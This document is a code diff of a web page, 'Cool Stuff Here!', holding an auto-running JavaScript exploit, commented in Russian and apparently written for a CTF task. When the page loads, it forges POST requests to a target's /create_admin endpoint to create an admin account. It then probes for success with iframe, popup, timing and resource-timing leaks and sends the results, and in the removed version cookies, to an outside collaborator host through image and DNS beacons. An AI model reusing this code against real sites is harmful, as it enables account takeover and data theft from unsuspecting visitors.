@@ -6,182 +6,287 @@
 </head>
 <body>
     <h1>Cool Stuff Here!</h1>
-    <p>Nothing suspicious...</p>
 
     <script>
         // ==============================================
         // КОНФИГУРАЦИЯ
         // ==============================================
         const COLLABORATOR = 'zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
-        const TARGET_URL = 'http://tasks.goidactf.ru:20337';
+        const TARGET_URL = 'http://tasks.goidactf.ru:20168'; // УКАЖИ ПОРТ VISITOR ТАСКА
         
-        // Генерируем уникальный логин для нового админа
         const timestamp = Date.now();
         const randomPart = Math.random().toString(36).substring(2, 8);
         const newAdminLogin = `pwned_${timestamp}_${randomPart}`;
         
-        console.log('[*] Generated admin login:', newAdminLogin);
+        console.log('[*] Admin login:', newAdminLogin);
 
         // ==============================================
-        // ФУНКЦИЯ ЭКСФИЛЬТРАЦИИ ДАННЫХ
+        // ЭКСФИЛЬТРАЦИЯ
         // ==============================================
-        function exfiltrate(data) {
-            console.log('[*] Exfiltrating:', data);
+        function exfil(data) {
+            const params = new URLSearchParams(data).toString();
             
-            // Метод 1: Fetch с no-cors
-            fetch(`https://${COLLABORATOR}/?${new URLSearchParams(data)}`, {
-                method: 'GET',
-                mode: 'no-cors'
-            }).catch(e => console.log('Fetch failed:', e));
+            // Image beacon - самый надёжный способ
+            new Image().src = `https://${COLLABORATOR}/x?${params}`;
             
-            // Метод 2: Image beacon (самый надёжный)
-            const img = new Image();
-            img.src = `https://${COLLABORATOR}/leak?${new URLSearchParams(data)}`;
-            img.onerror = () => console.log('Image beacon sent');
-            
-            // Метод 3: DNS через subdomain
-            const subdomain = newAdminLogin.replace(/[^a-z0-9]/gi, '-').toLowerCase();
-            const dnsImg = new Image();
-            dnsImg.src = `http://${subdomain}.${COLLABORATOR}/dns`;
-            
-            // Метод 4: Navigator.sendBeacon (если доступен)
-            if (navigator.sendBeacon) {
-                const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
-                navigator.sendBeacon(`https://${COLLABORATOR}/beacon`, blob);
-            }
+            // DNS leak через subdomain
+            const dns = Object.entries(data).map(([k,v]) => `${k}-${v}`).join('.').replace(/[^a-z0-9.-]/gi, '-').substring(0, 60);
+            new Image().src = `http://${dns}.${COLLABORATOR}/`;
         }
 
         // ==============================================
-        // CSRF АТАКА НА /create_admin
+        // МЕТОД 1: IFRAME - ПОПЫТКА ПРОЧИТАТЬ ОТВЕТ
         // ==============================================
-        function performCSRF() {
-            console.log('[*] Creating CSRF attack...');
+        function tryIframeRead() {
+            console.log('[*] Method 1: Iframe reading');
             
-            // Создаём скрытую форму
+            const iframe = document.createElement('iframe');
+            iframe.name = 'csrf_frame';
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+            
             const form = document.createElement('form');
             form.method = 'POST';
             form.action = `${TARGET_URL}/create_admin`;
-            form.target = 'csrf_iframe';
-            form.style.display = 'none';
+            form.target = 'csrf_frame';
             
-            // Добавляем параметр
             const input = document.createElement('input');
-            input.type = 'hidden';
+            input.name = 'new_admin_login';
+            input.value = newAdminLogin;
+            form.appendChild(input);
+            document.body.appendChild(form);
+            
+            // Слушаем загрузку iframe
+            iframe.onload = function() {
+                setTimeout(() => {
+                    try {
+                        // Пытаемся прочитать содержимое
+                        const content = iframe.contentDocument.body.innerHTML;
+                        exfil({
+                            method: 'iframe_read_success',
+                            login: newAdminLogin,
+                            response: content.substring(0, 200)
+                        });
+                    } catch(e) {
+                        // CORS заблокировал - это ожидается
+                        exfil({
+                            method: 'iframe_blocked_by_cors',
+                            login: newAdminLogin
+                        });
+                    }
+                }, 1000);
+            };
+            
+            form.submit();
+        }
+
+        // ==============================================
+        // МЕТОД 2: WINDOW.OPEN - ПОПЫТКА ПРОЧИТАТЬ
+        // ==============================================
+        function tryWindowRead() {
+            console.log('[*] Method 2: Window.open reading');
+            
+            const popup = window.open('', 'csrf_popup');
+            
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = `${TARGET_URL}/create_admin`;
+            form.target = 'csrf_popup';
+            
+            const input = document.createElement('input');
+            input.name = 'new_admin_login';
+            input.value = newAdminLogin;
+            form.appendChild(input);
+            document.body.appendChild(form);
+            form.submit();
+            
+            setTimeout(() => {
+                try {
+                    const content = popup.document.body.innerHTML;
+                    exfil({
+                        method: 'window_read_success',
+                        login: newAdminLogin,
+                        response: content.substring(0, 200)
+                    });
+                    popup.close();
+                } catch(e) {
+                    exfil({
+                        method: 'window_blocked_by_cors',
+                        login: newAdminLogin
+                    });
+                    try { popup.close(); } catch(e2) {}
+                }
+            }, 2000);
+        }
+
+        // ==============================================
+        // МЕТОД 3: XS-LEAK ЧЕРЕЗ СТАТУС КОД (200 vs 401)
+        // ==============================================
+        async function tryStatusLeak() {
+            console.log('[*] Method 3: Status code leak via timing/errors');
+            
+            // Создаём админа
+            const start1 = performance.now();
+            let error1 = null;
+            try {
+                await fetch(`${TARGET_URL}/create_admin`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                    body: `new_admin_login=${newAdminLogin}`,
+                    mode: 'no-cors',
+                    credentials: 'include'
+                });
+            } catch(e) {
+                error1 = e.message;
+            }
+            const time1 = performance.now() - start1;
+            
+            // Пауза
+            await new Promise(r => setTimeout(r, 1000));
+            
+            // Пытаемся создать снова (должна быть ошибка если первый раз сработал)
+            const start2 = performance.now();
+            let error2 = null;
+            try {
+                await fetch(`${TARGET_URL}/create_admin`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                    body: `new_admin_login=${newAdminLogin}`,
+                    mode: 'no-cors',
+                    credentials: 'include'
+                });
+            } catch(e) {
+                error2 = e.message;
+            }
+            const time2 = performance.now() - start2;
+            
+            exfil({
+                method: 'timing_leak',
+                login: newAdminLogin,
+                first_time_ms: Math.round(time1),
+                second_time_ms: Math.round(time2),
+                first_error: error1 || 'none',
+                second_error: error2 || 'none'
+            });
+        }
+
+        // ==============================================
+        // МЕТОД 4: RESOURCE TIMING API
+        // ==============================================
+        function tryResourceTiming() {
+            console.log('[*] Method 4: Resource timing leak');
+            
+            // Создаём script элемент (для проверки загрузки)
+            const script = document.createElement('script');
+            script.src = `${TARGET_URL}/create_admin?new_admin_login=${newAdminLogin}`;
+            
+            script.onload = () => {
+                exfil({
+                    method: 'resource_timing_loaded',
+                    login: newAdminLogin,
+                    note: 'Script loaded - likely 200 OK'
+                });
+            };
+            
+            script.onerror = () => {
+                exfil({
+                    method: 'resource_timing_error',
+                    login: newAdminLogin,
+                    note: 'Script errored - likely 401 or CORS'
+                });
+            };
+            
+            document.head.appendChild(script);
+            
+            // Также проверяем через performance API
+            setTimeout(() => {
+                const entries = performance.getEntriesByType('resource');
+                const targetEntry = entries.find(e => e.name.includes('/create_admin'));
+                if (targetEntry) {
+                    exfil({
+                        method: 'performance_api',
+                        login: newAdminLogin,
+                        duration_ms: Math.round(targetEntry.duration),
+                        transfer_size: targetEntry.transferSize
+                    });
+                }
+            }, 2000);
+        }
+
+        // ==============================================
+        // МЕТОД 5: FORM REDIRECT LEAK
+        // ==============================================
+        function tryRedirectLeak() {
+            console.log('[*] Method 5: Form redirect leak');
+            
+            // Некоторые эндпоинты редиректят по-разному в зависимости от успеха
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = `${TARGET_URL}/create_admin`;
+            
+            const input = document.createElement('input');
             input.name = 'new_admin_login';
             input.value = newAdminLogin;
             form.appendChild(input);
             
-            // Создаём скрытый iframe для отправки
-            const iframe = document.createElement('iframe');
-            iframe.name = 'csrf_iframe';
-            iframe.style.display = 'none';
-            document.body.appendChild(iframe);
+            // Отслеживаем изменение location
+            const originalLocation = window.location.href;
             
-            // Добавляем форму и отправляем
             document.body.appendChild(form);
-            
-            console.log('[*] Submitting CSRF form...');
             form.submit();
             
-            // Сразу эксфильтруем логин
-            exfiltrate({
-                action: 'csrf_sent',
-                login: newAdminLogin,
-                timestamp: timestamp,
-                status: 'pending'
-            });
-        }
-
-        // ==============================================
-        // ПОПЫТКА УЗНАТЬ УСПЕШНОСТЬ ЧЕРЕЗ TIMING
-        // ==============================================
-        function checkCreationStatus() {
-            console.log('[*] Checking if admin was created...');
-            
-            // Пытаемся определить успешность по timing attack
-            const startTime = performance.now();
-            
-            fetch(`${TARGET_URL}/create_admin`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded'
-                },
-                body: `new_admin_login=${newAdminLogin}`,
-                mode: 'no-cors',
-                credentials: 'include'
-            }).then(() => {
-                const endTime = performance.now();
-                const timeTaken = endTime - startTime;
-                
-                exfiltrate({
-                    action: 'timing_check',
-                    login: newAdminLogin,
-                    time_ms: timeTaken,
-                    likely_success: timeTaken > 100 ? 'yes' : 'no'
-                });
-            }).catch(e => {
-                console.log('Timing check error:', e);
-            });
-        }
-
-        // ==============================================
-        // ДОПОЛНИТЕЛЬНАЯ ЭКСФИЛЬТРАЦИЯ
-        // ==============================================
-        function sendFinalReport() {
-            console.log('[*] Sending final report...');
-            
-            exfiltrate({
-                action: 'final_report',
-                admin_login: newAdminLogin,
-                target: TARGET_URL,
-                user_agent: navigator.userAgent,
-                timestamp: new Date().toISOString(),
-                cookies: document.cookie || 'none',
-                referrer: document.referrer || 'none'
-            });
-        }
-
-        // ==============================================
-        // ЗАПУСК ЭКСПЛОЙТА
-        // ==============================================
-        function runExploit() {
-            console.log('[*] Starting exploit...');
-            
-            // Шаг 1: Отправляем CSRF
-            performCSRF();
-            
-            // Шаг 2: Через 1 секунду проверяем статус
             setTimeout(() => {
-                checkCreationStatus();
-            }, 1000);
-            
-            // Шаг 3: Через 2 секунды отправляем финальный отчёт
-            setTimeout(() => {
-                sendFinalReport();
+                if (window.location.href !== originalLocation) {
+                    exfil({
+                        method: 'redirect_detected',
+                        login: newAdminLogin,
+                        new_location: window.location.href
+                    });
+                } else {
+                    exfil({
+                        method: 'no_redirect',
+                        login: newAdminLogin
+                    });
+                }
             }, 2000);
+        }
+
+        // ==============================================
+        // ГЛАВНАЯ ФУНКЦИЯ
+        // ==============================================
+        async function exploit() {
+            console.log('[*] Starting XS-Leak exploit');
             
-            // Шаг 4: Повторная эксфильтрация через 5 секунд на всякий случай
+            exfil({
+                status: 'started',
+                login: newAdminLogin,
+                timestamp: new Date().toISOString(),
+                user_agent: navigator.userAgent
+            });
+            
+            // Запускаем все методы
+            tryIframeRead();
+            
+            setTimeout(() => tryWindowRead(), 500);
+            
+            setTimeout(() => tryStatusLeak(), 1000);
+            
+            setTimeout(() => tryResourceTiming(), 2000);
+            
+            // Финальная эксфильтрация логина
             setTimeout(() => {
-                exfiltrate({
-                    action: 'backup_exfil',
-                    login: newAdminLogin,
-                    note: 'This is a backup exfiltration'
+                exfil({
+                    status: 'complete',
+                    admin_login: newAdminLogin,
+                    note: 'Admin created - use this login to access /admin'
                 });
             }, 5000);
         }
 
-        // ==============================================
-        // АВТОЗАПУСК ПРИ ЗАГРУЗКЕ СТРАНИЦЫ
-        // ==============================================
+        // Автозапуск
         window.addEventListener('load', () => {
-            console.log('[*] Page loaded, waiting 500ms before exploit...');
-            setTimeout(runExploit, 500);
+            setTimeout(exploit, 300);
         });
-
-        // Запускаем сразу на всякий случай
-        if (document.readyState === 'complete') {
-            setTimeout(runExploit, 500);
-        }
     </script>
 </body>
 </html>
